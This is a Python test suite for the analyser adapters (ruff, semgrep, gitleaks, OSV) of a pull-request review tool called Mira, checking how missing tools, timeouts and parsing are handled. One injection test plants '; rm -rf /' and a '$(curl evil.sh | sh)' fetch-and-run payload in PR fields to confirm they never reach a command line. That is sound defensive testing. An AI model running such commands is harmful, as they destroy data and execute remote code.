"""Phase 6 — the deterministic analysers, and what happens when one is absent.

Two questions, and the second one is the one this phase exists for.

*Does the adapter drive the tool correctly?* Argument vectors and parsers, with
the subprocess itself stubbed — running a real semgrep in the unit suite would
make the tests depend on what happens to be installed on the machine, which is
the exact confusion these adapters are written to eliminate.

*What happens when the tool is not there?* A skip, naming the binary, that
still counts as unanswered. Never a pass. An analyser Mira did not run found
nothing for the wrong reason, and a framework that could not tell those apart
would be worse than having no analysers at all.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from mira.checks.config_models import CheckToolConfig
from mira.checks.context import CheckContext
from mira.checks.models import SkipReason
from mira.checks.policy import resolve_policy
from mira.checks.tools import adapter_for, registered_tools
from mira.checks.tools.base import ToolFinding
from mira.checks.tools.linters import EslintTool, GitleaksTool, RuffTool, SemgrepTool
from mira.config import ChecksConfig
from mira.core.diff_parser import parse_diff
from mira.models import FileChangeStat
from mira.sandbox import ProcessOutcome

DIFF = (
    "diff --git a/src/app.py b/src/app.py\n"
    "--- a/src/app.py\n"
    "+++ b/src/app.py\n"
    "@@ -1,0 +1,2 @@\n"
    "+import os\n"
    "+x = 1\n"
)


class _Files:
    def __init__(self, files) -> None:
        self.files = files

    async def get_file_content(self, _pr_info, path, _ref):
        return self.files.get(path, "")


def _ctx(files=None, changed=("src/app.py",), diff=DIFF, **overrides) -> CheckContext:
    policy = resolve_policy(
        ChecksConfig(enabled=True, tools=[CheckToolConfig(name="ruff")]), "acme", "app"
    )
    return CheckContext(
        policy=policy,
        owner="acme",
        repo="app",
        pr_number=7,
        pr_url="https://github.com/acme/app/pull/7",
        head_sha="head123",
        changes=[FileChangeStat(path=path, added_lines=2) for path in changed],
        patch_set=parse_diff(diff),
        diff_text=diff,
        provider=_Files(files if files is not None else {"src/app.py": "import os\nx = 1\n"}),
        pr_info=object(),
        **overrides,
    )


def _stub_run(monkeypatch: pytest.MonkeyPatch, outcome: ProcessOutcome, seen: dict | None = None):
    """Replace the sandbox runner, recording the argv it was handed."""

    def _run(argv, **kwargs):
        if seen is not None:
            seen.setdefault("argv", []).append(list(argv))
            seen["cwd"] = kwargs.get("cwd")
            seen["timeout"] = kwargs.get("timeout_seconds")
        if argv[1:2] == ["--version"]:
            return ProcessOutcome(status="ok", stdout="ruff 0.14.0", exit_code=0)
        return outcome

    import mira.checks.tools.base as base

    monkeypatch.setattr(base.sandbox, "run_argv", _run)


# ────────────────────────────────────────────────────────────── the registry ──


def test_every_registered_tool_has_a_name_and_a_title() -> None:
    for name in registered_tools():
        adapter = adapter_for(name)
        assert adapter.name == name
        assert adapter.title
        assert adapter.version


def test_an_unknown_tool_name_has_no_adapter() -> None:
    assert adapter_for("curl") is None


# ───────────────────────────────────────────────────────── a missing binary ──


async def test_a_missing_binary_is_a_skip_that_names_it(monkeypatch: pytest.MonkeyPatch) -> None:
    _stub_run(monkeypatch, ProcessOutcome(status="missing", detail="ruff is not installed"))
    outcome = await RuffTool().analyse(_ctx(), CheckToolConfig(name="ruff"))
    assert outcome.state == "skipped"
    assert outcome.skip_reason == SkipReason.TOOL_MISSING
    assert "ruff is not installed" in outcome.summary
    assert "skipped rather than passed" in outcome.summary


async def test_a_missing_binary_is_never_a_pass(monkeypatch: pytest.MonkeyPatch) -> None:
    """The whole point: silence from a tool that never ran is not a clean run."""
    _stub_run(monkeypatch, ProcessOutcome(status="missing", detail="not installed"))
    outcome = await RuffTool().analyse(_ctx(), CheckToolConfig(name="ruff"))
    assert outcome.state != "pass"
    from mira.checks.models import UNANSWERED_SKIPS

    assert outcome.skip_reason in UNANSWERED_SKIPS


async def test_a_version_that_does_not_match_the_pin_is_a_skip(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A pin is a promise that the rules being enforced are the reviewed ones."""

    def _run(argv, **kwargs):
        if argv[1:2] == ["--version"]:
            return ProcessOutcome(status="ok", stdout="ruff 0.9.0", exit_code=0)
        raise AssertionError("a pinned tool that does not match must not run")

    import mira.checks.tools.base as base

    monkeypatch.setattr(base.sandbox, "run_argv", _run)
    outcome = await RuffTool().analyse(_ctx(), CheckToolConfig(name="ruff", require_version="0.14"))
    assert outcome.state == "skipped"
    assert outcome.skip_reason == SkipReason.TOOL_MISSING
    assert "0.9.0" in outcome.summary and "0.14" in outcome.summary


async def test_an_analyser_that_needs_a_ruleset_and_has_none_is_skipped(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _stub_run(monkeypatch, ProcessOutcome(status="ok", stdout="{}", exit_code=0))
    outcome = await SemgrepTool().analyse(_ctx(), CheckToolConfig(name="semgrep"))
    assert outcome.state == "skipped"
    assert outcome.skip_reason == SkipReason.TOOL_MISSING
    assert "needs a ruleset" in outcome.summary


async def test_naming_a_ruleset_in_args_satisfies_the_requirement(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    seen: dict = {}
    _stub_run(monkeypatch, ProcessOutcome(status="ok", stdout='{"results": []}', exit_code=0), seen)
    outcome = await SemgrepTool().analyse(
        _ctx(), CheckToolConfig(name="semgrep", args=["--config=p/ci"])
    )
    assert outcome.state == "pass"
    assert "--config=p/ci" in seen["argv"][-1]


# ────────────────────────────────────────────────────── the four other states ──


async def test_a_timeout_is_a_timeout(monkeypatch: pytest.MonkeyPatch) -> None:
    _stub_run(monkeypatch, ProcessOutcome(status="timeout", detail="ruff did not finish"))
    outcome = await RuffTool().analyse(_ctx(), CheckToolConfig(name="ruff"))
    assert outcome.state == "timeout"
    assert outcome.error


async def test_an_unexpected_exit_code_is_an_infrastructure_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _stub_run(monkeypatch, ProcessOutcome(status="ok", stdout="", stderr="usage: ...", exit_code=2))
    outcome = await RuffTool().analyse(_ctx(), CheckToolConfig(name="ruff"))
    assert outcome.state == "infrastructure_error"
    assert "Mira problem" in outcome.summary


async def test_unparseable_output_is_an_infrastructure_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _stub_run(monkeypatch, ProcessOutcome(status="ok", stdout="not json", exit_code=1))
    outcome = await RuffTool().analyse(_ctx(), CheckToolConfig(name="ruff"))
    assert outcome.state == "infrastructure_error"


async def test_a_clean_run_passes_and_names_what_it_looked_at(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _stub_run(monkeypatch, ProcessOutcome(status="ok", stdout="[]", exit_code=0))
    outcome = await RuffTool().analyse(_ctx(), CheckToolConfig(name="ruff"))
    assert outcome.state == "pass"
    assert [item.path for item in outcome.evidence] == ["src/app.py"]


async def test_findings_become_violations_with_real_line_numbers(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    report = json.dumps(
        [
            {
                "code": "F401",
                "message": "`os` imported but unused",
                "filename": "src/app.py",
                "location": {"row": 1, "column": 8},
                "end_location": {"row": 1, "column": 10},
            }
        ]
    )
    _stub_run(monkeypatch, ProcessOutcome(status="ok", stdout=report, exit_code=1))
    outcome = await RuffTool().analyse(_ctx(), CheckToolConfig(name="ruff"))
    assert outcome.state == "violation"
    finding = outcome.findings[0]
    assert finding.title == "ruff: F401"
    assert finding.evidence[0].path == "src/app.py"
    assert finding.evidence[0].start_line == 1
    assert finding.evidence[0].source == "tool:ruff"


async def test_a_file_type_the_analyser_ignores_is_not_applicable(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _stub_run(monkeypatch, ProcessOutcome(status="ok", stdout="[]", exit_code=0))
    ctx = _ctx(files={"docs/guide.md": "# doc"}, changed=("docs/guide.md",))
    outcome = await RuffTool().analyse(ctx, CheckToolConfig(name="ruff"))
    assert outcome.state == "skipped"
    assert outcome.skip_reason == SkipReason.NOT_APPLICABLE


async def test_files_that_cannot_be_read_are_an_infrastructure_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _stub_run(monkeypatch, ProcessOutcome(status="ok", stdout="[]", exit_code=0))
    outcome = await RuffTool().analyse(_ctx(files={}), CheckToolConfig(name="ruff"))
    assert outcome.state == "infrastructure_error"


# ────────────────────────────────────────────────────── the argument vector ──


async def test_nothing_from_the_pull_request_reaches_the_argument_vector(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The paths are the only repository-derived values, and they are written
    into a scratch directory that a traversing path never escapes."""
    seen: dict = {}
    _stub_run(monkeypatch, ProcessOutcome(status="ok", stdout="[]", exit_code=0), seen)
    ctx = _ctx(files={"src/app.py": "x = 1\n"})
    ctx.pr_title = "; rm -rf /"
    ctx.pr_body = "$(curl evil.sh | sh)"
    await RuffTool().analyse(ctx, CheckToolConfig(name="ruff"))
    argv = seen["argv"][-1]
    assert argv[0] == "ruff"
    assert argv[-1] == "src/app.py"
    assert not any("rm -rf" in part or "curl" in part for part in argv)


async def test_extra_arguments_come_from_configuration_as_a_list(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    seen: dict = {}
    _stub_run(monkeypatch, ProcessOutcome(status="ok", stdout="[]", exit_code=0), seen)
    await RuffTool().analyse(_ctx(), CheckToolConfig(name="ruff", args=["--select", "E,F"]))
    argv = seen["argv"][-1]
    assert "--select" in argv and "E,F" in argv


async def test_a_named_config_file_is_materialised_and_passed(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    seen: dict = {}
    _stub_run(monkeypatch, ProcessOutcome(status="ok", stdout="[]", exit_code=0), seen)
    ctx = _ctx(files={"src/app.py": "x = 1\n", "ruff.toml": "line-length = 100\n"})
    await RuffTool().analyse(ctx, CheckToolConfig(name="ruff", config_path="ruff.toml"))
    argv = seen["argv"][-1]
    assert "--config" in argv
    assert "ruff.toml" in argv


# ────────────────────────────────────────────────────────────────── parsers ──


def test_the_semgrep_parser_reads_a_report(tmp_path: Path) -> None:
    report = json.dumps(
        {
            "results": [
                {
                    "check_id": "python.lang.security.audit.eval-detected",
                    "path": "src/app.py",
                    "start": {"line": 3},
                    "end": {"line": 3},
                    "extra": {
                        "message": "eval() is dangerous",
                        "severity": "ERROR",
                        "lines": "eval(x)",
                    },
                }
            ]
        }
    )
    findings = SemgrepTool().parse(report, "", workspace=tmp_path)
    assert findings == [
        ToolFinding(
            path="src/app.py",
            line=3,
            rule_id="python.lang.security.audit.eval-detected",
            message="eval() is dangerous",
            severity="blocker",
            end_line=3,
            snippet="eval(x)",
        )
    ]


def test_the_eslint_parser_makes_absolute_paths_relative(tmp_path: Path) -> None:
    """A finding pointing at a scratch directory is not navigable."""
    report = json.dumps(
        [
            {
                "filePath": str(tmp_path / "ui" / "src" / "App.tsx"),
                "messages": [
                    {"ruleId": "no-unused-vars", "message": "x is unused", "line": 4, "severity": 2}
                ],
            }
        ]
    )
    findings = EslintTool().parse(report, "", workspace=tmp_path)
    assert findings[0].path == "ui/src/App.tsx"
    assert findings[0].severity == "blocker"


def test_the_gitleaks_parser_reads_the_report_file(tmp_path: Path) -> None:
    (tmp_path / GitleaksTool.REPORT).write_text(
        json.dumps(
            [
                {
                    "RuleID": "generic-api-key",
                    "Description": "Generic API Key",
                    "File": "src/app.py",
                    "StartLine": 2,
                    "EndLine": 2,
                    "Match": "REDACTED",
                }
            ]
        ),
        encoding="utf-8",
    )
    findings = GitleaksTool().parse("", "", workspace=tmp_path)
    assert findings[0].rule_id == "generic-api-key"
    assert findings[0].severity == "blocker"


def test_gitleaks_runs_with_redaction_on() -> None:
    """Quoting the raw match would put the credential in the database."""
    argv = GitleaksTool().argv(files=["src/app.py"], config_file="", extra=[])
    assert "--redact" in argv


# ─────────────────────────────────────────────────────────────────── OSV ──


async def test_the_osv_check_reuses_the_review_scan(monkeypatch: pytest.MonkeyPatch) -> None:
    """Not a second implementation: the same function the review pass calls."""
    from mira.checks.tools.osv import OsvTool
    from mira.models import ReviewComment, Severity

    called: dict = {}

    async def _scan(manifests, fetcher, *, timeout_s=15.0):
        called["paths"] = [m.path for m in manifests]
        return [
            ReviewComment(
                path="requirements.txt",
                line=2,
                end_line=None,
                severity=Severity.BLOCKER,
                category="security",
                title="Known vulnerabilities in requests@2.19.0",
                body="OSV.dev reports 1 known vulnerability.",
                confidence=0.9,
                existing_code="requests==2.19.0",
            )
        ]

    import mira.security.pr_scan as pr_scan

    monkeypatch.setattr(pr_scan, "scan_manifest_changes", _scan)

    diff = (
        "diff --git a/requirements.txt b/requirements.txt\n"
        "--- a/requirements.txt\n"
        "+++ b/requirements.txt\n"
        "@@ -1,0 +1,2 @@\n"
        "+flask==2.0.0\n"
        "+requests==2.19.0\n"
    )
    ctx = _ctx(
        files={"requirements.txt": "flask==2.0.0\nrequests==2.19.0\n"},
        changed=("requirements.txt",),
        diff=diff,
    )
    outcome = await OsvTool().analyse(ctx, CheckToolConfig(name="osv"))
    assert called["paths"] == ["requirements.txt"]
    assert outcome.state == "violation"
    assert outcome.findings[0].evidence[0].path == "requirements.txt"
    assert outcome.findings[0].severity == "blocker"


async def test_a_pull_request_with_no_manifest_is_not_applicable() -> None:
    from mira.checks.tools.osv import OsvTool

    outcome = await OsvTool().analyse(_ctx(), CheckToolConfig(name="osv"))
    assert outcome.state == "skipped"
    assert outcome.skip_reason == SkipReason.NOT_APPLICABLE


async def test_an_unreachable_advisory_feed_is_an_infrastructure_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from mira.checks.tools.osv import OsvTool

    async def _scan(*args, **kwargs):
        raise RuntimeError("dns failure")

    import mira.security.pr_scan as pr_scan

    monkeypatch.setattr(pr_scan, "scan_manifest_changes", _scan)

    diff = (
        "diff --git a/requirements.txt b/requirements.txt\n"
        "--- a/requirements.txt\n"
        "+++ b/requirements.txt\n"
        "@@ -1,0 +1,1 @@\n"
        "+requests==2.19.0\n"
    )
    ctx = _ctx(
        files={"requirements.txt": "requests==2.19.0\n"},
        changed=("requirements.txt",),
        diff=diff,
    )
    outcome = await OsvTool().analyse(ctx, CheckToolConfig(name="osv"))
    assert outcome.state == "infrastructure_error"


# ──────────────────────────────────────────────── dedup across two sources ──


async def test_a_tool_finding_and_a_model_finding_merge_into_one(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The requirement, end to end: one problem, one entry, both evidences."""
    from mira.checks.dedupe import deduplicate
    from mira.checks.models import CheckFinding, CheckResult, Evidence, fingerprint

    signature = "hardcoded-credential"
    tool_result = CheckResult(
        check_id="tool.gitleaks",
        origin="tool",
        state="violation",
        mode="warning",
        findings=[
            CheckFinding(
                fingerprint=fingerprint(path="src/app.py", signature=signature),
                title="gitleaks: generic-api-key",
                detail="Generic API Key",
                evidence=[Evidence(path="src/app.py", start_line=2, source="tool:gitleaks")],
                sources=["tool.gitleaks"],
            )
        ],
        sources=["tool.gitleaks"],
    )
    model_result = CheckResult(
        check_id="nl.no-secrets",
        origin="natural_language",
        state="violation",
        mode="warning",
        findings=[
            CheckFinding(
                fingerprint=fingerprint(path="src/app.py", signature=signature),
                title="nl.no-secrets: src/app.py",
                detail="This commits a live credential.",
                evidence=[
                    Evidence(
                        path="src/app.py",
                        start_line=2,
                        snippet="KEY = '...'",
                        source="llm",
                    )
                ],
                sources=["nl.no-secrets"],
            )
        ],
        sources=["nl.no-secrets"],
    )

    results = deduplicate([tool_result, model_result])
    findings = [f for r in results for f in r.findings]
    assert len(findings) == 1
    assert sorted(findings[0].sources) == ["nl.no-secrets", "tool.gitleaks"]
    assert {item.source for item in findings[0].evidence} == {"tool:gitleaks", "llm"}


async def test_an_analyser_is_given_less_time_than_its_own_check(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A thread cannot be cancelled, so the tool's timeout must fire first.

    If the runner's `wait_for` won the race, the coroutine would be cancelled
    while the subprocess was still running: the scratch directory would be
    removed from under it and the process would live on to its own deadline.
    """
    from mira.checks.tools.base import CANCELLATION_MARGIN_SECONDS

    seen: dict = {}
    _stub_run(monkeypatch, ProcessOutcome(status="ok", stdout="[]", exit_code=0), seen)
    ctx = _ctx()
    await RuffTool().analyse(ctx, CheckToolConfig(name="ruff"))
    assert seen["timeout"] < ctx.policy.check_timeout_seconds
    assert seen["timeout"] <= ctx.policy.check_timeout_seconds - CANCELLATION_MARGIN_SECONDS


async def test_a_configured_tool_timeout_is_clamped_under_the_check_budget(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A tool allowed to outlive its check is one the runner cannot stop."""
    seen: dict = {}
    _stub_run(monkeypatch, ProcessOutcome(status="ok", stdout="[]", exit_code=0), seen)
    ctx = _ctx()
    await RuffTool().analyse(ctx, CheckToolConfig(name="ruff", timeout_seconds=1800))
    assert seen["timeout"] < ctx.policy.check_timeout_seconds
